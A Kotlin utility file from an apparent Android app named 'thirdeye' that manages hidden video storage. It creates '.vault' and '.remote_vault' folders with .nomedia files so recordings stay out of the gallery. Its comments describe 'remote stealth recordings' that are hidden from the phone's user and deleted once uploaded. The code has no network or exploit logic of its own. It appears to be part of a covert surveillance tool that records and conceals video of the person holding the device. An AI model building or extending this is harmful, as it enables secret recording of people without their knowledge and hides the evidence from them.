package com.thirdeye.app.utils

import android.content.Context
import android.os.Environment
import android.os.StatFs
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object StorageUtil {

    /**
     * Returns the private hidden directory for manual phone recorded videos.
     * Contains a .nomedia file so standard Android gallery/photos won't index it.
     */
    fun getSecretVideoDirectory(context: Context): File {
        val baseDir = context.getExternalFilesDir(Environment.DIRECTORY_MOVIES) ?: context.filesDir
        val secretFolder = File(baseDir, ".vault")
        if (!secretFolder.exists()) {
            secretFolder.mkdirs()
        }

        // Place .nomedia file inside to hide from gallery scanners
        val noMedia = File(secretFolder, ".nomedia")
        if (!noMedia.exists()) {
            try {
                noMedia.createNewFile()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        return secretFolder
    }

    /**
     * Returns dedicated temporary hidden directory for REMOTE stealth recordings.
     * These files are never shown in the phone app and are purged immediately upon upload.
     */
    fun getRemoteSecretVideoDirectory(context: Context): File {
        val baseDir = context.cacheDir ?: context.filesDir
        val remoteFolder = File(baseDir, ".remote_vault")
        if (!remoteFolder.exists()) {
            remoteFolder.mkdirs()
        }
        val noMedia = File(remoteFolder, ".nomedia")
        if (!noMedia.exists()) {
            try {
                noMedia.createNewFile()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        return remoteFolder
    }

    /**
     * Creates a new output MP4 file for manual phone recordings.
     */
    fun createOutputFile(context: Context): File {
        val dir = getSecretVideoDirectory(context)
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        return File(dir, "REC_${timestamp}.mp4")
    }

    /**
     * Creates a new temporary output MP4 file for remote stealth recordings.
     */
    fun createRemoteOutputFile(context: Context): File {
        val dir = getRemoteSecretVideoDirectory(context)
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        return File(dir, "REMOTE_REC_${timestamp}.mp4")
    }

    /**
     * Returns available storage in Megabytes.
     */
    fun getAvailableStorageMB(context: Context): Long {
        val dir = getSecretVideoDirectory(context)
        val stat = StatFs(dir.path)
        val bytesAvailable = stat.availableBlocksLong * stat.blockSizeLong
        return bytesAvailable / (1024 * 1024)
    }

    /**
     * Returns list of only manual phone-recorded videos, sorted newest first.
     * Explicitly hides all remote recordings from the phone user.
     */
    fun getRecordedVideos(context: Context): List<File> {
        val dir = getSecretVideoDirectory(context)
        return dir.listFiles { file ->
            file.isFile && file.name.startsWith("REC_") && file.name.endsWith(".mp4") && file.length() > 0
        }?.sortedByDescending { it.lastModified() } ?: emptyList()
    }
}
